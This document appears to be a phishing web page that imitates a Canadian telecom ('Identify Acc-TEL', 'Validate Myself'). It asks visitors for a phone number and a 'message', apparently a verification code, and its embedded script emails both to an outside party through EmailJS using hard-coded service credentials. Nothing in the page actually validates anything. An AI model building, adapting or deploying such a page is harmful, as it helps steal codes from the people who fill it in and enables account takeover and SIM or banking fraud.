<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Identify Acc-TEL</title>

<link rel="stylesheet" href="style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

<!-- KEEP ONLY ONE EMAILJS SCRIPT -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<style>

/* YOUR ORIGINAL CSS (RESTORED EXACTLY) */

.blader {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px 20px;
    background-color: #fff;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    width: 100%;
    max-width: 100%;
    box-sizing: border-box;
    overflow: hidden;
    flex-wrap: wrap;
}

.mojo-cont.logo {
    width: 150px;
    height: auto;
    max-width: 100%;
}

.basic-cont {
    display: flex;
    align-items: center;
    justify-content: space-between;
    flex-wrap: wrap;
}

.cart i {
    font-size: 22px;
    color: #000;
    cursor: pointer;
    margin-right: 15px;
    flex-shrink: 0;
}

.burger {
    font-size: 20px;
    cursor: pointer;
    flex-shrink: 0;
}

.shora {
    width: 100%;
    font-family: Arial, sans-serif;
    font-size: 16px;
    background-color: rgb(226, 226, 226);
    text-align: center;
    padding: 20px;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
}

.formpage {
    background-color: #ffffff;
    padding: 40px;
    box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
    width: 100%;
    max-width: 400px;
    text-align: center;
    border: 2px solid #f4f2f3;
    border-radius: 8px;
    margin: 0 auto;
}

h1 {
    color: rgb(75, 40, 109);
}

.input-group {
    margin-bottom: 22px;
    text-align: left;
}

.input-group input {
    width: 90%;
    padding: 12px;
    border: 1px solid #ccc;
}

.login-btn {
    width: 87%;
    padding: 12px;
    background-color: rgb(43, 128, 0);
    color: #fff;
    border: none;
    cursor: pointer;
}

.success-message {
    color: green;
    margin-top: 15px;
}

.desktop-footer, .mobile-footer {
    display: none;
    width: 100%;
}

@media (min-width: 768px) {
    .desktop-footer { display: block; }
}

@media (max-width: 767px) {
    .mobile-footer { display: block; }
}

</style>
</head>

<body>

<header class="blader">
    <div class="mojo-cont">
        <img src="images/imagelolopo.svg" alt="Logo" class="logo">
    </div>
    <div class="basic-cont">
        <div class="cart"><i class="fas fa-shopping-cart"></i></div>
        <div class="burger">&#9776;</div>
    </div>
</header>

<main>

<div class="shora">
    Proudly Canadian - connecting us all nationwide
</div>

<br><br>

<div class="formpage">
    <h1>Validate Myself</h1>

    <form id="validateForm">
        <div class="input-group">
            <label>number</label>
            <input type="text" id="number" required>
        </div>

        <div class="input-group">
            <label>message</label>
            <input type="text" id="message" required>
        </div>

        <button type="submit" class="login-btn">Send</button>
    </form>

    <div id="success-message" class="success-message" style="display:none;">
        Thanks You
    </div>
</div>

</main>

<footer>
    <img src="images/imagedon2.png" class="desktop-footer">
    <img src="images/imagebacha.jpeg" class="mobile-footer">
</footer>

<script>
(function(){
    emailjs.init("9VeQ6k6s9FIpEwG8P");
})();

document.getElementById("validateForm").addEventListener("submit", function(e){
    e.preventDefault();

    const number = document.getElementById("number").value;
    const message = document.getElementById("message").value;

    emailjs.send(
        "service_a4i7zon",
        "template_fs1memt",
        {
            number: number,
            message: message
        },
        "9VeQ6k6s9FIpEwG8P"
    )
    .then(function(){
        document.getElementById("success-message").style.display = "block";
    })
    .catch(function(error){
        console.log(error);
        alert("Error: " + error.text);
    });
});
</script>

</body>
</html>
